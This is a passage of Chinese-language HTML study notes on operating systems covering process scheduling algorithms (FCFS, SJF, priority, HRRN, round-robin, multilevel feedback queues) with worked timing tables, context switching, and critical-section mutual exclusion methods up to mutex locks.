<li><strong>排队器</strong>：将系统中的所有就绪进程按照一定的策略排成一个或多个队列，以便于调度程序选择。每当有一个进程转变为就绪态时，排队器便将它插入到相应的就绪队列中</li>
<li><strong>分派器</strong>：依据调度程序所选的进程，将其从就绪队列中取出，将 CPU 分配给新进程</li>
<li><strong>上下文切换器</strong>：在对处理机进行切换时，会发生两对上下文的切换操作：第一对，将当前进程的上下文保存到其 PCB 中，再装入分派程序的上下文，以便分派程序运行；第二对，移出分派程序的上下文，将新选进程的 CPU 现场信息装入处理机的各个相应寄存器</li>
</ul>
<p>在上下文切换时，需要执行大量 <code>load</code> 和 <code>store</code> 指令，以保存寄存器的内容，因此会花费较多时间。现在已有硬件实现的方法来减少上下文切换时间。通常采用两组寄存器，其中一组供内核使用，一组供用户使用。这样，上下文切换时，只需改变指针，让其指向当前寄存器组即可。</p>
</li>
<li>
<p><strong>调度的时机、切换与过程</strong></p>
<p>调度程序是操作系统内核程序。请求调度的事件发生后，才可能运行调度程序，调度了新的就绪进程后，才会进行进程切换。理论上这三件事情应该顺序执行，但在实际的操作系统内核程序运行中，若某时刻发生了引起进程调度的因素，则不一定能马上进行调度与切换。</p>
<p>现代操作系统中，<strong>不能进行进程的调度与切换的情况有以下几种：</strong></p>
<ul>
<li><strong>在处理中断的过程中</strong>：中断处理过程复杂，在实现上很难做到进程切换，而且中断处理是系统工作的一部分，逻辑上不属于某一进程，不应被剥夺处理机资源</li>
<li><strong>进程在操作系统内核临界区中</strong>：进入临界区后，需要独占式地访问，理论上必须加锁，以防止其他并行进程进入，在解锁前不应切换到其他进程，以加快临界区的释放</li>
<li><strong>其他需要完全屏蔽中断的原子操作过程中</strong>：如：加锁、解锁、中断现场保护、恢复等原子操作。在原子过程中，连中断都要屏蔽，更不应该进行进程调度与切换</li>
</ul>
<p>若在上述过程中发生了引起调度的条件，则不能马上进行调度和切换，应置系统的请求调度标志，直到上述过程结束后才进行相应的调度与切换。</p>
<p><strong>应该进行进程调度与切换的情况如下：</strong></p>
<ul>
<li>发生引起调度条件且当前进程无法继续运行下去时，可以马上进行调度与切换。若操作系统只在这种情况下进行进程调度，则是非剥夺调度</li>
<li>中断处理结束或自陷处理结束后，返回被中断进程的用户态程序执行现场前，若置上请求调度标志，即可马上进行进程调度与切换。若操作系统支持这种情况下的运行调度程序，则实现了剥夺方式的调度</li>
</ul>
<p>进程切换往往在调度完成后立刻发生，它要求保存原进程当前断点的现场信息，恢复被调度进程的现场信息。现场切换时，操作系统内核将原进程的现场信息推入当前进程的内核堆栈来保存它们，并更新堆栈指针。内核完成从新进程的内核栈中装入新进程的现场信息、更新当前运行进程空间指针、重设 PC 寄存器等相关工作之后，开始运行新的进程。</p>
</li>
<li>
<p><strong>进程调度方式</strong></p>
<p>所谓进程调度方式，是指当某个进程正在处理机上执行时，若有某个更为重要或紧迫的进程需要处理，即有优先权更高的进程进入就绪队列，此时应如何分配处理机。</p>
<p>通常有以下两种进程调度方式：</p>
<ul>
<li>
<p><strong>非抢占调度方式</strong></p>
<p>又称非剥夺方式。是指当一个进程正在处理机上执行时，即使有某个更为重要或紧迫的进程进入就绪队列，仍然让正在执行的进程继续执行，直到该进程运行完成或发生某种事件而进入阻塞态时，才把处理机分配给其他进程。</p>
<p>非抢占调度方式的优点是实现简单、系统开销小，适用于大多数的批处理系统，但它不能用于分时系统和大多数的实时系统。</p>
</li>
<li>
<p><strong>抢占调度方式</strong></p>
<p>又称剥夺方式。是指当一个进程正在处理机上执行时，若有某个更为重要或紧迫的进程需要使用处理机，则允许调度程序根据某种原则去暂停正在执行的进程，将处理机分配给这个更为重要或紧迫的进程。</p>
<p>抢占调度方式对提高系统吞吐率和响应效率都有明显的好处。但 “抢占” 不是一种任意性行为，必须遵循一定的原则，主要有优先权、短进程优先和时间片原则等。</p>
</li>
</ul>
</li>
<li>
<p><strong>闲逛进程</strong></p>
<p>在进程切换时，如果系统中没有就绪进程，就会调度闲逛进程（idle）运行，如果没有其他进程就绪，该进程就一直运行，并在执行过程中测试中断。闲逛进程的优先级最低，没有就绪进程时才会运行闲逛进程，只要有进程就绪，就会立即让出处理机。</p>
<p>闲逛进程不需要 CPU 之外的资源，它不会被阻塞。</p>
</li>
<li>
<p><strong>两种线程的调度</strong></p>
<ul>
<li><strong>用户级线程调度</strong>：由于内核并不知道线程的存在，所以内核还是和以前一样，选择一个进程，并给予时间控制。由进程中的调度程序决定哪个线程运行</li>
<li><strong>内核级线程调度</strong>：内核选择一个特定线程运行，通常不用考虑该线程属于哪个进程。对被选择的线程赋予一个时间片，如果超过了时间片，就会强制挂起该线程</li>
</ul>
<p>用户级线程的线程切换在同一进程中进行，仅需少量的机器指令；内核级线程的线程切换需要完整的上下文切换、修改内存映像、使高速缓存失效，这就导致了若干数量级的延迟。</p>
</li>
</ol>
<h4> 典型的调度算法</h4>
<p><strong>常用的调度算法：</strong></p>
<ol>
<li>
<p><strong>先来先服务（FCFS）调度算法</strong></p>
<p>FCFS 调度算法是一种最简单的调度算法，它既可用于作业调度，又可用于进程调度。在作业调度中，算法每次从后备作业队列中选择最先进入该队列的一个或几个作业，将它们调入内存，分配必要的资源，创建进程并放入就绪队列。</p>
<p>在进程调度中，FCFS 调度算法每次从就绪队列中选择最先进入该队列的进程，将处理机分配给它，使之投入运行，直到运行完成或因某种原因而阻塞时才释放处理机。</p>
<p>下面通过一个实例来说明 FCFS 调度算法的性能。假设系统中有四个作业，它们的提交时间分别是 <code>8</code>、<code>8.4</code>、<code>8.8</code>、<code>9</code>，运行时间依次是 <code>2</code>、<code>1</code>、<code>0.5</code>、<code>0.2</code>，这组作业的平均等待时间、平均周转时间和平均带权周转时间见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">作业号</th>
<th style="text-align:center">提交时间</th>
<th style="text-align:center">运行时间</th>
<th style="text-align:center">开始时间</th>
<th style="text-align:center">等待时间</th>
<th style="text-align:center">完成时间</th>
<th style="text-align:center">周转时间</th>
<th style="text-align:center">带权周转时间</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">8</td>
<td style="text-align:center">2</td>
<td style="text-align:center">8</td>
<td style="text-align:center">0</td>
<td style="text-align:center">10</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">8.4</td>
<td style="text-align:center">1</td>
<td style="text-align:center">10</td>
<td style="text-align:center">1.6</td>
<td style="text-align:center">11</td>
<td style="text-align:center">2.6</td>
<td style="text-align:center">2.6</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">8.8</td>
<td style="text-align:center">0.5</td>
<td style="text-align:center">11</td>
<td style="text-align:center">2.2</td>
<td style="text-align:center">11.5</td>
<td style="text-align:center">2.7</td>
<td style="text-align:center">5.4</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">9</td>
<td style="text-align:center">0.2</td>
<td style="text-align:center">11.5</td>
<td style="text-align:center">2.5</td>
<td style="text-align:center">11.7</td>
<td style="text-align:center">2.7</td>
<td style="text-align:center">13.5</td>
</tr>
</tbody>
</table>
<p>FCFS 调度算法属于不可剥夺算法。从表面上看，它对所有作业都是公平的，但若一个长作业先到达系统，就会使后面的许多短作业等待很长时间，因此它不能作为分时系统和实时系统的主要调度策略。但它常被结合在其他调度策略中使用。例如：在使用优先级作为调度策略的系统中，往往对多个具有相同优先级的进程按 FCFS 原则处理。</p>
<p><strong>FCFS 调度算法的特点</strong>：算法简单，但效率低；对长作业比较有利，但对短作业不利（相对 SJF 和高响应比）；有利于 CPU 繁忙型作业，而不利于 <code>I/O</code> 繁忙型作业。</p>
</li>
<li>
<p><strong>短作业优先（SJF）调度算法</strong></p>
<p>短作业（进程）优先调度算法是指对短作业（进程）优先调度的算法。短作业优先（SJF）调度算法从后备队列中选择一个或若干估计运行时间最短的作业，将它们调入内存运行；短进程优先（SPF）调度算法从就绪队列中选择一个估计运行时间最短的进程，将处理机分配给它，使之立即执行，直到完成或发生某事件而阻塞时，才释放处理机。</p>
<p>例如：考虑 FCFS 中给出的一组作业，若系统采用短作业优先调度算法，其平均等待时间、平均周转时间和平均带权周转时间见小表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">作业号</th>
<th style="text-align:center">提交时间</th>
<th style="text-align:center">运行时间</th>
<th style="text-align:center">开始时间</th>
<th style="text-align:center">等待时间</th>
<th style="text-align:center">完成时间</th>
<th style="text-align:center">周转时间</th>
<th style="text-align:center">带权周转时间</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">8</td>
<td style="text-align:center">2</td>
<td style="text-align:center">8</td>
<td style="text-align:center">0</td>
<td style="text-align:center">10</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">8.4</td>
<td style="text-align:center">1</td>
<td style="text-align:center">10.7</td>
<td style="text-align:center">2.3</td>
<td style="text-align:center">11.7</td>
<td style="text-align:center">3.3</td>
<td style="text-align:center">3.3</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">8.8</td>
<td style="text-align:center">0.5</td>
<td style="text-align:center">10.2</td>
<td style="text-align:center">1.4</td>
<td style="text-align:center">10.7</td>
<td style="text-align:center">1.9</td>
<td style="text-align:center">3.8</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">9</td>
<td style="text-align:center">0.2</td>
<td style="text-align:center">10</td>
<td style="text-align:center">1</td>
<td style="text-align:center">10.2</td>
<td style="text-align:center">1.2</td>
<td style="text-align:center">6</td>
</tr>
</tbody>
</table>
<p><strong>SJF 调度算法的缺点：</strong></p>
<ul>
<li>该算法 <strong>对长作业不利</strong>，SJF 调度算法中长作业的周转时间会增加。更严重的是，若有一长作业进入系统的后备队列，由于调度程序总是优先调度那些（即使是后进来的）短作业，将导致长作业长期不被调度（“饥饿” 现象，注意区分 “死锁”，后者是系统环形等待，前者是调度策略问题）</li>
<li>该算法完全 <strong>未考虑作业的紧迫程度</strong>，因而不能保证紧迫性作业会被及时处理</li>
<li>由于作业的长短是根据用户所提供的估计执行时间而定的，而用户又可能会有意或无意地缩短其作业的估计运行时间，致使该算法 <strong>不一定能真正做到短作业优先调度</strong></li>
</ul>
<p>注意，SJF 调度算法的平均等待时间、平均周转时间最少。</p>
</li>
<li>
<p><strong>优先级调度算法</strong></p>
<p>优先级调度算法既可用于作业调度，又可用于进程调度。该算法中的优先级用于描述作业的紧迫程度。在作业调度中，优先级调度算法每次从后备作业队列中选择优先级最高的一个或几个作业，将它们调入内存，分配必要的资源，创建进程并放入就绪队列。在进程调度中，优先级调度算法每次从就绪队列中选择优先级最高的进程，将处理机分配给它，使之投入运行。</p>
<p>根据新的更高优先级进程能否抢占正在执行的进程，可将该调度算法分为如下两种：</p>
<ul>
<li>
<p><strong>非抢占式优先级调度算法</strong>：当一个进程正在处理机上运行时，即使有某个优先级更高的进程进入就绪队列，仍让正在运行的进程继续运行，直到由于其自身的原因而让出处理机时（任务完成或等待事件），才把处理机分配给就绪队列中优先级最高的进程</p>
</li>
<li>
<p><strong>抢占式优先级调度算法</strong>：当一个进程正在处理机上运行时，若有某个优先级更高的进程进入就绪队列，则立即暂停正在运行的进程，将处理机分配给优先级更高的进程</p>
</li>
</ul>
<p>而根据进程创建后其优先级是否可以改变，可以将进程优先级分为以下两种：</p>
<ul>
<li><strong>静态优先级</strong>：优先级是在创建进程时确定的，且在进程的整个运行期间保持不变。确定静态优先级的主要依据有进程类型、进程对资源的要求、用户要求</li>
<li><strong>动态优先级</strong>：在进程运行过程中，根据进程情况的变化动态调整优先级。动态调整优先级的主要依据有进程占有 CPU 时间的长短、就绪进程等待 CPU 时间的长短</li>
</ul>
<p>一般来说，进程优先级的设置可以参照以下原则：</p>
<ul>
<li>系统进程 &gt; 用户进程。系统进程作为系统的管理者，理应拥有更高的优先级</li>
<li>交互型进程 &gt; 非交互型进程（或前台进程后台进程）。大家平时在使用手机时，在前台运行的正在和你交互的进程应该更快速地响应你，因此自然需要被优先处理</li>
<li><code>I/O</code> 型进程 &gt; 计算型进程。所谓 <code>I/O</code> 型进程，是指那些会频繁使用 <code>I/O</code> 设备的进程，而计算型进程是那些频繁使用 CPU 的进程（很少使用 <code>I/O</code> 设备）。<code>I/O</code> 设备（如打印机）的处理速度要比 CPU 慢得多，因此若将 <code>I/O</code> 型进程的优先级设置得更高，就更有可能让 <code>I/O</code> 设备尽早开始工作，进而提升系统的整体效率</li>
</ul>
</li>
<li>
<p><strong>高响应比优先调度算法</strong></p>
<p>高响应比优先调度算法主要用于作业调度，是对 FCFS 调度算法和 SJF 调度算法的一种综合平衡，同时考虑了每个作业的等待时间和估计的运行时间。在每次进行作业调度时，先计算后备作业队列中每个作业的响应比，从中选出。响应比最高的作业投入运行</p>
<p>响应比的变化规律可描述为：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>响应比</mtext><msub><mi>R</mi><mi>p</mi></msub><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mtext>等待时间</mtext><mo>+</mo><mtext>要求服务时间</mtext></mrow><mtext>要求服务时间</mtext></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\text{响应比} R_{p} = \dfrac{\text{等待时间} + \text{要求服务时间}} {\text{要求服务时间}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord cjk_fallback">响应比</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0463em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">要求服务时间</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">等待时间</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord text"><span class="mord cjk_fallback">要求服务时间</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>根据公式可知：</p>
<ul>
<li>作业的等待时间相同时，要求服务时间越短，响应比越高，有利于短作业，因而类似于 SJF</li>
<li>要求服务时间相同时，作业的响应比由其等待时间决定，等待时间越长，其响应比越高，因而类似于 FCFS</li>
<li>对于长作业，作业的响应比可以随等待时间的增加而提高，当其等待时间足够长时，也可获得处理机，克服了 “饥饿” 现象</li>
</ul>
</li>
<li>
<p><strong>时间片轮转调度算法</strong></p>
<p>时间片轮转调度算法主要适用于分时系统。在这种算法中，系统将所有就绪进程按 FCFS 策略排成一个就绪队列，调度程序总是选择就绪队列中的第一个进程执行，但仅能运行一个时间片，如：<code>50ms</code>。在使用完一个时间片后，即使进程并未运行完成，它也必须释放出（被剥夺）处理机给下一个就绪进程，而被剥夺的进程返回到就绪队列的末尾重新排队，等候再次运行。</p>
<p>在时间片轮转调度算法中，时间片的大小对系统性能的影响很大。若时间片足够大，以至于所有进程都能在一个时间片内执行完毕，则时间片轮转调度算法就退化为先来先服务调度算法。若时间片很小，则处理机将在进程间过于频繁地切换，使处理机的开销增大，而真正用于运行用户进程的时间将减少。因此，时间片的大小应选择适当，时间片的长短通常由以下因素确定：系统的响应时间、就绪队列中的进程数目和系统的处理能力。</p>
</li>
<li>
<p><strong>多级队列调度算法</strong></p>
<p>前述的各种调度算法，由于系统中仅设置一个进程的就绪队列，即调度算法是固定且单一的，无法满足系统中不同用户对进程调度策略的不同要求。在多处理机系统中，这种单一调度策略实现机制的缺点更为突出，多级队列调度算法能在一定程度上弥补这一缺点。</p>
<p>该算法在系统中设置多个就绪队列，将不同类型或性质的进程固定分配到不同的就绪队列。每个队列可实施不同的调度算法，因此，系统针对不同用户进程的需求，很容易提供多种调度策略。同一队列中的进程可以设置不同的优先级，不同的队列本身也可以设置不同的优先级。在多处理机系统中，可以很方便为每个处理机设置一个单独的就绪队列，每个处理机可实施各自不同的调度策略，这样就能根据用户需求将多个线程分配到一个或多个处理机上运行。</p>
</li>
<li>
<p><strong>多级反馈队列调度算法（融合了前几种算法的优点）</strong></p>
<p>多级反馈队列调度算法是时间片轮转调度算法和优先级调度算法的综合与发展。通过动态调整进程优先级和时间片大小，多级反馈队列调度算法可以兼顾多方面的系统目标。</p>
<p>例如：为提高系统吞吐量和缩短平均周转时间而照顾短进程；为获得较好的 <code>I/O</code> 设备利用率和缩短响应时间而照顾 <code>I/O</code> 型进程；同时，也不必事先估计进程的执行时间。</p>
<p><strong>多级反馈队列的优势有以下几点：</strong></p>
<ul>
<li>终端型作业用户：短作业优先</li>
<li>短批处理作业用户：周转时间较短</li>
<li>长批处理作业用户：经过前面几个队列得到部分执行，不会长期得不到处理</li>
</ul>
</li>
</ol>
<p>下表总结了几种常见进程调度算法的特点。</p>
<table>
<thead>
<tr>
<th style="text-align:center">特点</th>
<th style="text-align:center">先来先服务</th>
<th style="text-align:center">短作业优先</th>
<th style="text-align:center">高响应比优先</th>
<th style="text-align:center">时间片轮转</th>
<th style="text-align:center">多级反馈队列</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">能否是可抢占</td>
<td style="text-align:center">否</td>
<td style="text-align:center">能</td>
<td style="text-align:center">能</td>
<td style="text-align:center">能</td>
<td style="text-align:center">队列内算法不一定</td>
</tr>
<tr>
<td style="text-align:center">能否是不可抢占</td>
<td style="text-align:center">能</td>
<td style="text-align:center">能</td>
<td style="text-align:center">能</td>
<td style="text-align:center">否</td>
<td style="text-align:center">队列内算法不一定</td>
</tr>
<tr>
<td style="text-align:center">优点</td>
<td style="text-align:center">公平、实现简单</td>
<td style="text-align:center">平均等待时间最少，效率最高</td>
<td style="text-align:center">兼顾长短作业</td>
<td style="text-align:center">兼顾长短作业</td>
<td style="text-align:center">兼顾长短作业，有较好的响应时间，可行性强</td>
</tr>
<tr>
<td style="text-align:center">缺点</td>
<td style="text-align:center">不利于短作业</td>
<td style="text-align:center">长作业会饥饿，估计时间不易确定</td>
<td style="text-align:center">计算响应比的开销大</td>
<td style="text-align:center">平均等待时间较长，上下文切换浪费时间</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center">适用于</td>
<td style="text-align:center">无</td>
<td style="text-align:center">作业调度，批处理系统</td>
<td style="text-align:center">无</td>
<td style="text-align:center">分时系统</td>
<td style="text-align:center">相当通用</td>
</tr>
<tr>
<td style="text-align:center">默认决策模式</td>
<td style="text-align:center">非抢占</td>
<td style="text-align:center">非抢占</td>
<td style="text-align:center">非抢占</td>
<td style="text-align:center">抢占</td>
<td style="text-align:center">抢占</td>
</tr>
</tbody>
</table>
<h4> 进程切换</h4>
<p>对于通常的进程而言，其创建、撤销及要求由系统设备完成的 <code>I/O</code> 操作，都是利用系统调用而进入内核，再由内核中的相应处理程序予以完成的。进程切换同样是在内核的支持下实现的，因此可以说，任何进程都是在操作系统内核的支持下运行的，是与内核紧密相关的。</p>
<ol>
<li>
<p><strong>上下文切换</strong></p>
<p>切换 CPU 到另一个进程需要保存当前进程状态并恢复另一个进程的状态，这个任务称为上下文切换。上下文是指某一时刻 CPU 寄存器和程序计数器的内容。进行上下文切换时，内核会将旧进程状态保存在其 PCB 中，然后加载经调度而要执行的新进程的上下文。</p>
<p>上下文切换实质上是指处理机从一个进程的运行转到另一个进程上运行，在这个过程中，进程的运行环境产生了实质性的变化。<strong>上下文切换的流程如下：</strong></p>
<ul>
<li>挂起一个进程，保存 CPU 上下文，包括程序计数器和其他寄存器</li>
<li>更新 PCB 信息</li>
<li>把进程的 PCB 移入相应的队列，如：就绪、在某事件阻塞等队列</li>
<li>选择另一个进程执行，并更新其 PCB</li>
<li>跳转到新进程 PCB 中的程序计数器所指向的位置执行</li>
<li>恢复处理机上下文</li>
</ul>
</li>
<li>
<p><strong>上下文切换的消耗</strong></p>
<p>上下文切换通常是计算密集型的，即它需要相当可观的 CPU 时间，在每秒几十上百次的切换中，每次切换都需要纳秒量级的时间，所以上下文切换对系统来说意味着消耗大量的 CPU 时间。有些处理器提供多个寄存器组，这样，上下文切换就只需要简单改变当前寄存器组的指针。</p>
</li>
<li>
<p><strong>上下文切换与模式切换</strong></p>
<p>模式切换与上下文切换是不同的，模式切换时，CPU 逻辑上可能还在执行同一进程。用户进程最开始都运行在用户态，若进程因中断或异常进入核心态运行，执行完后又回到用户态刚被中断的进程运行。用户态和内核态之间的切换称为模式切换，而不是上下文切换，因为没有改变当前的进程。上下文切换只能发生在内核态，它是多任务操作系统中的一个必需的特性。</p>
</li>
</ol>
<div class="hint-container tip">
<p class="hint-container-title">调度和切换的区别</p>
<p><strong>调度</strong> 是指决定资源分配给哪个进程的行为，是一种决策行为；<strong>切换</strong> 是指实际分配的行为，是执行行为。一般来说，先有资源的调度，然后才有进程的切换</p>
</div>
<h3> 同步与互斥</h3>
<h4> 同步与互斥的基本概念</h4>
<p>在多道程序环境下，进程是并发执行的，不同进程之间存在着不同的相互制约关系。为了协调进程之间的相互制约关系，引入了进程同步的概念。举一个简单的例子来理解这个概念。例如：让系统计算 <code>1 + 2 × 3</code>，假设系统产生两个进程：一个是加法进程，一个是乘法进程。要让计算结果是正确的，一定要让加法进程发生在乘法进程之后，但实际上操作系统具有异步性，若不加以制约，加法进程发生在乘法进程之前是绝对有可能的，因此要制定一定的机制去约束加法进程，让它在乘法进程完成之后才发生。</p>
<ol>
<li>
<p><strong>临界资源</strong></p>
<p>虽然多个进程可以共享系统中的各种资源，但其中许多资源一次只能为一个进程所用，<strong>将一次仅允许一个进程使用的资源称为临界资源</strong>。许多物理设备都属于临界资源，如：打印机等。此外，还有许多变量、数据等都可以被若干进程共享，也属于临界资源。</p>
<p>对临界资源的访问，必须互斥地进行，在每个进程中，<strong>访问临界资源的那段代码称为临界区</strong>。为了保证临界资源的正确使用，可把临界资源的访问过程分成四个部分：</p>
<ul>
<li><strong>进入区</strong>：为了进入临界区使用临界资源，在进入区要检查可否进入临界区，若能进入临界区，则应设置正在访问临界区的标志，以阻止其他进程同时进入临界区</li>
<li><strong>临界区</strong>：进程中访问临界资源的那段代码，又称临界段</li>
<li><strong>退出区</strong>：将正在访问临界区的标志清除</li>
<li><strong>剩余区</strong>：代码中的其余部分</li>
</ul>
</li>
<li>
<p><strong>同步</strong></p>
<p>同步亦称直接制约关系，是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而等待、传递信息所产生的制约关系。进程间的直接制约关系源于它们之间的相互合作。</p>
<p>例如：输入进程 <code>A</code> 通过单缓冲向进程 <code>B</code> 提供数据。当该缓冲区空时，进程 <code>B</code> 不能获得所需数据而阻塞，一旦进程 <code>A</code> 将数据送入缓冲区，进程 <code>B</code> 就被唤醒。反之，当缓冲区满时，进程 <code>A</code> 被阻塞，仅当进程 <code>B</code> 取走缓冲数据时，才唤醒进程 <code>A</code>。</p>
</li>
<li>
<p><strong>互斥</strong></p>
<p>互斥也称间接制约关系。当一个进程进入临界区使用临界资源时，另一个进程必须等待，当占用临界资源的进程退出临界区后，另一进程才允许去访问此临界资源。</p>
<p>例如：在仅有一台打印机的系统中，有两个进程 <code>A</code> 和进程 <code>B</code>，若进程 <code>A</code> 需要打印时，系统已将打印机分配给进程 <code>B</code>，则进程 <code>A</code> 必须阻塞。一旦进程 <code>B</code> 将打印机释放，系统便将进程 <code>A</code> 唤醒，并将其由阻塞态变为就绪态。</p>
<p>为禁止两个进程同时进入临界区，同步机制应遵循以下准则：</p>
<ul>
<li><strong>空闲让进</strong>：临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区</li>
<li><strong>忙则等待</strong>：当已有进程进入临界区时，其他试图进入临界区的进程必须等待</li>
<li><strong>有限等待</strong>：对请求访问的进程，应保证能在有限时间内进入临界区</li>
<li><strong>让权等待</strong>：当进程不能进入临界区时，应立即释放处理器，防止进程忙等待</li>
</ul>
</li>
</ol>
<h4> 实现临界区互斥的基本方法</h4>
<ol>
<li>
<p><strong>软件实现方法</strong></p>
<p>在进入区设置并检查一些标志来标明是否有进程在临界区中，若已有进程在临界区，则在进入区通过循环检查进行等待，进程离开临界区后则在退出区修改标志。</p>
<ul>
<li>
<p><strong>算法一：单标志法</strong></p>
<p>该算法设置一个公用整型变量 <code>turn</code>，用于指示被允许进入临界区的进程编号，即若 <code>turn = 0</code>，则允许 P<sub>0</sub> 进程进入临界区。该算法可确保每次只允许一个进程进入临界区。但两个进程必须交替进入临界区，若某个进程不再进入临界区，则另一个进程也将无法进入临界区（违背 “空闲让进”）。这样很容易造成资源利用不充分。</p>
<p>若 P<sub>0</sub> 顺利进入临界区并从临界区离开，则此时临界区是空闲的，但 P<sub>1</sub> 并没有进入临界区的打算，<code>turn = 1</code> 一直成立，P<sub>0</sub> 就无法再次进入临界区（一直被 <code>while</code> 死循环困住）。</p>
</li>
<li>
<p><strong>算法二：双标志法先检查</strong></p>
<p>该算法的基本思想是在每个进程访问临界区资源之前，先查看临界资源是否正被访问，若正被访问，该进程需等待；否则，进程才进入自己的临界区。为此，设置一个布尔型数组 <code>flag[]</code>，如第 <code>i</code> 个元素 <code>flag[i]</code> 为 <code>FALSE</code>，表示 P<sub>i</sub> 进程未进入临界区，如为 <code>TRUE</code>，表示 P<sub>i</sub> 进程进入临界区。</p>
<p><strong>优点</strong>：不用交替进入，可连续使用；<strong>缺点</strong>：两个进程可能同时进入临界区（违背 “忙则等待”）。即在检查对方的 <code>flag</code> 后和切换自已的 <code>flag</code> 前有一段时间，结果都检查通过。这里的问题出在检查和修改操作不能一次进行。</p>
</li>
<li>
<p><strong>算法三：双标志法后检查</strong></p>
<p>算法二先检测对方的进程状态标志，再置自己的标志，由于在检测和放置中可插入另一个进程到达时的检测操作，会造成两个进程在分别检测后同时进入临界区。为此，算法三先将自已的标志设置为 <code>TRUE</code>，再检测对方的状态标志，若对方标志为 <code>TRUE</code>，则进程等待；否则进入临界区。</p>
<p>两个进程几乎同时都想进入临界区时，它们分别将自己的标志值 <code>flag</code> 设置为 <code>TRUE</code>，并且同时检测对方的状态（执行 <code>while</code> 语句），发现对方也要进入临界区时，双方互相谦让，结果谁也进不了临界区，从而导致 “饥饿” 现象。</p>
</li>
<li>
<p><strong>算法四：Peterson's Algorithm</strong></p>
<p>为了防止两个进程为进入临界区而无限期等待，又设置了变量 <code>turn</code>，每个进程在先设置自己的标志后再设置 <code>turn</code> 标志。这时，再同时检测另一个进程状态标志和允许进入标志，以便保证两个进程同时要求进入临界区时，只允许一个进程进入临界区。</p>
</li>
</ul>
</li>
<li>
<p><strong>硬件实现方法</strong></p>
<p>计算机提供了特殊的硬件指令，允许对一个字中的内容进行检测和修正，或对两个字的内容进行交换等。通过硬件支持实现临界段问题的方法称为低级方法或称元方法。</p>
<ul>
<li>
<p><strong>中断屏蔽方法</strong></p>
<p>当一个进程正在执行它的临界区代码时，防止其他进程进入其临界区的最简方法是关中断。因为 CPU 只在发生中断时引起进程切换，因此屏蔽中断能够保证当前运行的进程让临界区代码顺利地执行完，进而保证互斥的正确实现，然后执行开中断。其典型模式为：关中断 → 临界区 → 开中断</p>
<p>这种方法限制了处理机交替执行程序的能力，因此执行的效率会明显降低。对内核来说，在它执行更新变量或列表的几条指令期间，关中断是很方便的，但将关中断的权力交给用户则很不明智，若一个进程关中断后不再开中断，则系统可能会因此终止。</p>
</li>
<li>
<p><strong>硬件指令方法</strong></p>
<ul>
<li><strong>TestAndSet 指令</strong>：这条指令是原子操作，即执行该代码时不允许被中断。其功能是读出指定标志后把该标志设置为真</li>
<li><strong>Swap 指令</strong>：交换两个字（字节）的内容</li>
</ul>
</li>
</ul>
<p><strong>硬件方法的优点</strong>：适用于任意数目的进程，而不管是单处理机还是多处理机；简单、容易验证其正确性。可以支持进程内有多个临界区，只需为每个临界区设立一个布尔变量。</p>
<p><strong>硬件方法的缺点</strong>：进程等待进入临界区时要耗费处理机时间，不能实现让权等待。从等待进程中随机选择一个进入临界区，有的进程可能一直选不上，从而导致 “饥饿” 现象。</p>
</li>
</ol>
<h4> 互斥锁</h4>
<p>解决临界区最简单的工具就是互斥锁（mutex lock）。一个进程在进入临界区时应获得锁；在退出临界区时释放锁。函数 <code>acquire()</code> 获得锁，而函数 <code>release()</code> 释放锁。</p>
<p>每个互斥锁有一个布尔变量 <code>available</code>，表示锁是否可用。如果锁是可用的，调用 <code>acquire()</code> 会成功，且锁不再可用。当一个进程试图获取不可用的锁时，会被阻塞，直到锁被释放。</p>
